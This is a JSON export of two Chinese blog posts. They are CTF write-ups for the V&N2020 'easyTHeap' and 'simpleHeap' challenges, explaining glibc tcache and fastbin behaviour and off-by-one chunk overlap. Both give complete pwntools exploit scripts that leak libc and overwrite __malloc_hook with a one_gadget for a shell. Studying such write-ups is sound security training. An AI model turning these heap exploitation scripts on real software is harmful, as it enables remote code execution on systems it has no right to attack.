{"posts":[{"title":"[V&N2020 公开赛]easyTHeap","content":"用这个题来总结一下tcache attack 关于tcache参考了这个师傅的博客：https://www.jianshu.com/p/9778331e1337 tcache tcache结构体 Tcache机制是在libc-2.26中引入的一个新的堆管理机制。 首先是引进了两个结构体，tcache_perthread_struct和tcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; 第一个结构体用来管理堆，大小为0x240，可以管理大小小于0x400的堆块，为啥呢？写个简单的小demo大家就明白了 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } 上面简单的例子，就是申请了从0x10-0x70大小的堆块，然后我们全部都free掉，然后gdb调试一下会发现如下结果 可以看到tcache_perthread_struct结构体是以一个堆的形式存在于堆空间中管理者堆块，其大小为 0x250，然后不考虑其prevsize和size位，前0x40的空间管理着所有tcache bin的个数（最大是7），从0x10开始，那么就是 0x40 * 8 * 2 = 1024，hex(1024) = 0x400，所以它最大可存到0x400的堆块。 对比fastbin tcache bin与fastbin极其相似但是又有所不同 同：管理方式为FILO的单链表形式，每一个bins的inuse位总为1，不担心合并 异：fastbin的fd的指针指向chunk ptr，而tcache指向mem ptr。tcache不检查chunk的size是否符合要求，也就是说指哪打哪，不用考虑size位了，比如打__malloc_hook不用分配到-0x23的位置了，想分配到哪就分配到哪。tcache不检查double free。tcache优先级最高。 malloc和free的过程 malloc： malloc(size)，若size小于0x400会优先从tcache bins里面寻找，若没有，则再从别的bins里面找。 Tcachebin未满时，却从Fastbin/Smallbin中取出堆块，则会将链上的其他堆块都链入Tcachebin中。其具体算法是首先将Fastbin/Smallbin中取出的堆块指针进行保存，并判断该大小对应的Tcachebin是否未满，若未满则将其之后的堆块按照Fastbin/Smallbin的分配顺序将堆块链入Tcachebin中，直到对应大小的Tcachebin放满或Fastbin/Smallbin的链为空，最后将之前取出的堆块指针返回给用户使用。由于是按照Fastbin/Smallbin的分配顺序将堆块放入Tcachebin中，因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的。 文字看不懂（我也没看懂 orz）？没关系，上代码。 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } 没错，申请了十个相同大小的chunk，然后全部free掉，其中c开头的是放到tcache bins中的，f开头的是tcache满了然后被放到了fastbins里面中去。 看一下内存分布 然后我们改一下源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } 思路就是我们将tcachebin填满，然后free3次同样大小的chunk，发现进入到fastbin里面，然后我们通过malloc将tcachebin全部清空，如下图 可以看到此时tcachebin已经空了 fastbin里面是这样的 然后再malloc一次，发现fastbin被清空，剩余的两个bin被移到tcachebin里面去 本来是350指向330 移入到tcache后变成了340(0x350 - 0x10)指向了360 证明了前文的结论，“因此不难判断，最从Tcachebin中申请的堆块顺序是与正常从Fastbin/Smallbin中申请堆块顺序时反向的”。 利用方法 贴个大佬总结的，我仔细看了看这几个方法的说明，本题目应该用了以下前三个漏洞，其实叫啥名不重要，会用就行~ Tcache poisoning（tcache 投毒） 在上一部分中也提到过这种方法。与Fastbin Attack类似，篡改Tcachebin中的fd字段，导致在申请被篡改堆块后的下一个堆块时能够申请到任意地址。与Fastbin相比，Tcachebin中为了得到更高的效率而舍去了安全性，在进行申请时没有对size位进行校验，而且由于Tcachebin中的fd是指向下一个堆块的fd(Fastbin的fd是指向下一个堆块的堆头)，因此指向的地址即是申请后写数据的地址，不再需要去考虑堆头的偏移。 Tcache dup（？？？） 这是Tcache机制刚推出的几个版本中，在进行free操作时没有对这个堆块进行一个安全检测而导致可以对同一个堆块进行多次free，那么就会变成一个Tcachebin链上链了两个相同的堆块(我指向我自己)，后面也就不用多说了。但值得一提的是在libc-2.29版本中加入了检查机制(源码的4201-4216行)，会在堆块进行free时检查这个堆块是否已经存在于这条链上，如果存在则会报&quot;free():double free detected in tcache 2&quot;的错误，因此这种直接double free利用方式存在于libc-2.26至libc-2.28的版本中。 Tcache perthread corruption （结构体污染） 在最开始介绍结构体时提到的tcache_perthread_struct结构体，该结构体size为0x250，是管理整个Tcachebin的结构体，如果对这个结构体有写权限，那么可以控制任意大小Tcachebin的入口地址。 U2T（翻译君死了） U2T即Unsortbin 2 Tcachebin，这种叫法是在一篇文章中看到的，也只看到过一次，主要是配合Off By One或Off By NULL的漏洞，使Unsortbin在合并过程中将中间的Tcachebin合并，从而达到修改fd字段的效果。 题目 逆向 稍微逆一下就发现了delete的时候存在UAF漏洞 不过必须要注意的是，我们只能malloc 7次，free 3次 pwn it !!! 这道题保护全开，所以我们可以攻击__malloc_hook 思路： 1，攻击__malloc_hook，必须要伪造chunk，我们可以利用tcache的特点，利用结构体污染，将tcache_perthread_struct的指针域改为__malloc_hook附近 2，污染结构体，必须要能分配到结构体上，我们可选择double free，但是前提必须要知道结构体的地址，我们可以利用show来泄漏地址，malloc(size),free(),free()，这样该chunk就记录了自己的地址，减去0x250就是结构体的地址 3，打one_gadget，必须要知道libc基地址，我们利用free态的结构体堆块（0x250会进入unsorted bin），泄漏main_arena上方的__malloc_hook拿到基地址 一种方法 唔……，本地只有2.28版本的libc，所以本地不可能打通，简单写了一下，然后one_gadget和最后realloc调栈桢的时候都是抄的别的师傅的偏移orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:逃逸tcache ==============&quot;) print(&quot;-------- 利用double free，将fd ptr 写到 tcache处 -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- 改写tcahche结构体中堆块的数量，使以后的chunk可以不进入tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct 但是这里的size仍然是0x251 edit(3,b'a' * 0x30) print('================= step2:泄漏libc ==============') print('----- 利用3号堆块（tcache结构体堆块），释放后进入unsorted bin中，泄漏libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- 获得一些函数和one gadget的地址 ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: 攻击 __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() 另一种方法 （似乎还有别的方法，我再想想还能不能用别的方法做出来（逃 ） 好像又找到了一种构造方式，本质思路没有变，细节稍微改动了一下，比如泄漏libc换成了0号chunk（哈哈哈 from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: 逃逸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: 泄漏libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #触发one_gadget p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 公开赛]simpleHeap","content":"通过这个题目来学习 off-by-one 什么是off by one(null) ? 定义我也不知道，直接说我的理解。就是那种在用户输入时，一个循环处理边界问题或者是数组越界，对我们的输入没有很好的处理，就会导致一个字节的溢出（或者是strcpy处理不当）。 利用off-by-one 有师傅喜欢叫off-by-one 为一个字节的偷渡攻击 给攻击者发挥的攻击空间也只有一个字节，所以利用方式还是有一定限制的 我们最常利用的（或许是）手法是 堆块重叠（chunk extend），跟我之前讲过的“堆块怀孕”本质是一个东西，chunk extend 的利用条件如下： 1，能够进行堆空间的布局（即写入之类的功能） 2，至少能够溢出一个字节 其中第二个条件正好符合off-by-one的情景 利用过程：off-by-one + chunk extend 由于本人水平有限（wtcl orz 所以就举两个例子好了，一个是开启了Full RELRO，一个没开启 got表无防护的利用情景 既然got表无防护，那么我们可以利用这一个字节的溢出来改写got表，看详细的c代码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } 思路是申请三个chunk，大小分别为0x18,0x20,0x30 第一个chunk用来出发off-by-one 漏洞，第二个chunk用来构筑堆块重叠，第三个chunk用来构筑 fake chunk，我们利用第一个chunk溢出一字节来改写第二个chunk的size位，然后将第三个chunk来包含进去，然后free两次，在malloc一次，拿到big chunk的控制权，通过向big chunk里写入内容，改写free small chunk的fd pointer(此时smaller chunk还是free态)，接着malloc两次，我们就能够拿到一个fake chunk，如果fake chunk位于got表附近，那么我们便可以劫持got表项继而拿到shell 接下来我们看具体的调试过程。 malloc拿到三个堆块： 人为构造一个off-by-one来溢出一字节： free两次，可以看到我们改写后的chunk已经变成了free态： 通过向big chunk里写内容可以改写fd pointer，可以看到2号chunk的pointer已经变成了‘AAAA’…… 这个便是劫持got表的流程 got 表不可写： 对于got表项不可写的elf，我们可以借鉴fastbin attack的思路来攻击__malloc_hook函数，将__malloc_hook函数改写成one_gadget，触发malloc拿shell 思路很简单，大体思路和上面一样，然后三号chunk的fd pointer可以写成__malloc_hook+23的位置（字节错位，具体原因不再赘述），然后将__malloc_hook改写即可，注意的是，为了达到fastbin attack的目的，我们3号块的mem大小必须是0x60，因为要把0x7f的fake chunk链接在同一个bin中 题目解析： 逆向过程： 代码量尚可，off-by-one的漏洞还是有一定隐秘性的，具体的逆向分析不再赘述 注意两个点即可： 第一，本程序不存在UAF漏洞，即delete函数中对free的chunk处理的很好，把free态的指针数据都给清空了 第二，就是off-by-one的产生的位置 可以看到，if判断语句是小于号，也就是说当变量等于size+1的时候依然可以可以读入数据，这就是典型的off-by-one漏洞 pwn it ！！！ 思路分析 这个程序保护全开，所以我们不能攻击got表了，我们只能选择__malloc_hook函数，但是我们要想找到__malloc_hook函数，我们必须泄漏libc，但是程序只允许我们申请fastbin大小的chunk 这个题有一个很巧妙的泄漏libc的方法，就是将两个fastbin合并成一个unsortedbin，利用unsorted bin来泄漏main_arena + 88的位置，然后拿到libc基址。 具体思路是这样的，构造四个chunk： chunk 0 : size 0x18 chunk 1 : size 0x50 chunk 2 : size 0x60 chunk 3 : size 0x10 （防止与top chunk合并） 我们通过off-by-one将1和2合并，free 1，这个时候1和2合并的chunk已经超过fastbin，进入unsorted bin，我们再malloc(0x50)，这个时候unsorted bin就会切割下来0x50，剩下2号chunk留在unsorted bin里面，但是！！我们从始至终都没有free chunk 2，2号指针的控制权仍然在我们手中，所以我们可以打印2号chunk的内容，为什么呢？因为2号chunk在unsorted bin里，其fd 和 bk都是有内容的！！他们都指向了main_arena + 88，通过这一点，我们就能泄漏出libc的基地址 我们拿到基址后，就得想办法fastbin attack，有一种办法就是我们上文说的方法，构造三个fastbin chunk，自然是可以的，但是如果题目限制我们malloc次数，我们还有办法吗？（这个题目虽然限制次数，但是依然申请三次依然在允许的范围之内） 答案是有的，我们可以malloc(0x60)，记成chunk 4，然后我们紧接着free 4，这么做的目的就是将这块chunk从unsorted bin中移动到 fastbin中，so 我们再次利用 allocated 态的2号pointer来edit，把fd位改成__malloc_hook - 0x23，然后one_gadget 但是这个题目在gadget的时候我们发现是有问题的，因为四个gadget的寄存器的条件我们均不满足，所以我们得借助__libc_realloc函数来调整寄存器的值，在__libc_realloc函数中会调用__realloc_hook函数，所以我们把one_gadget的位置打到__realloc_hook的位置，把__libc_realloc的地址打到__malloc_hook里面即可，令人兴奋的是，__realloc_hook的位置就在__malloc_hook的上方，这样我们的程序执行流程为，我们malloc---&gt;触发__malloc_hook---&gt;跳转到__libc_realloc调整寄存器---&gt;触发__realloc_hook---&gt;__realloc_hook是我们的one_gadget---&gt;get shell !!! __malloc_hook = fake_chunk_mem - 0x13 __realloc_hook = fake_chunk_mem - 0x13 - 0x5 漏洞利用 exp:（pwntools版本是python3的版本） from pwn import * local = 0 if local == 1: sh = process('./vn_pwn_simpleHeap') else: sh = remote('node3.buuoj.cn',28903) libc = ELF('./libc-2.23.so') elf = ELF('./vn_pwn_simpleHeap') def add(size,content): sh.recvuntil('choice: ') sh.sendline('1') sh.sendlineafter('size?',str(size)) sh.sendafter('content:',content) def edit(index,content): sh.sendlineafter('choice: ','2') sh.sendlineafter('idx?',str(index)) sh.sendafter('content',content) def show(index): sh.sendlineafter('choice: ','3') sh.sendlineafter('idx?',str(index)) def delete(index): sh.sendlineafter('choice: ','4') sh.sendlineafter('idx?',index) print(&quot;============================== 1: by using off-by-one we can do a overlapping chunk ===================== &quot;) add(0x18,b'A'*0x18) #index 0 0x18 because we use the next chunk prevsize double using add(0x50,b'A') #index 1 add(0x60,b'A') #index 2 add(0x10,b'A') #index 3 to protect edit(0,b'A' * 0x18 + b'\\xd1') # off by one to change the &quot;index 1&quot; chunk's size print(&quot;============================ 2: leak libc by unsortedbin ==================================== &quot;) delete('1') add(0x50,'B') show(2) #index 2 memorize the unsorted bin's fd pointer and bk pointer but we don't free index 2 main_arena_88 = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) main_arena = main_arena_88 - 88 libc_base = (main_arena - 0x10) - libc.symbols['__malloc_hook'] #libc_base = __malloc_hook - __malloc_hook_offset print(hex(libc_base)) print(&quot;================================ 3: fastbin attack ---&gt; attack __malloc_hook-0x23 ================&quot;) malloc_hook = libc_base + libc.symbols['__malloc_hook'] fake_chunk = malloc_hook - 0x23 print('the next,we use 2 pointers to point a same chunk!!!!!!!!!!!!!!!!!!!!!!!!!!') add(0x60,b'A' * 16) #index 4 delete('2') print('########################## actually , the free pointer &quot;index 2&quot; and the allocated pointer &quot;index 4&quot; point a same chunk ################') print(&quot;######### we use the allocated pointer to write 'fd pointer' #############&quot;) edit(4,p64(fake_chunk)+b'\\n') one_gadget = libc_base + 0x4526a #one_gadget print(&quot;################# by gdb ,we find that we can't one_gadget.So we must change the stack(rsp) by __libc_realloc ################&quot;) realloc_hook = libc_base + libc.symbols['__libc_realloc'] + 12 realloc_hook_1 = libc_base + 0x846CC print(&quot;we change the '__malloc_hook' '__libc_realloc'(it will be call realloc_hook!!!) , 'realloc_hook' change to one_gadget !!!!&quot;) print(&quot;'realloc_hook' in '__malloc_hook'-0x8 !!!!!!!! &quot;) payload = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook) + b'\\n' add(0x60,'A') #index 2 which fd pointer point fake chunk add(0x60,payload) #index fake chunk print(&quot;============================== 4: one_gadget ===========================&quot;) sh.sendline('1') sh.sendline('32') sh.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-simpleheap/"}]}